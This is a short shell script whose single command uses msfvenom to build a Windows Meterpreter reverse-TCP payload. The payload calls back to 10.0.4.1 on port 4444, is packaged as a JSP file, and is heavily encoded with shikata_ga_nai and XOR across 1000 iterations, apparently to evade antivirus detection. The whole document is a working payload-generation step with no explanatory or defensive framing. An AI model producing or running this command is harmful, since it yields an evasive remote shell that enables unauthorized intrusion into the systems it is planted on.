#!/bin/sh
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.0.4.1 lport=4444 -f jsp -e x86/shikata_ga_nai --encrypt xor -i 1000 > payload.jsp
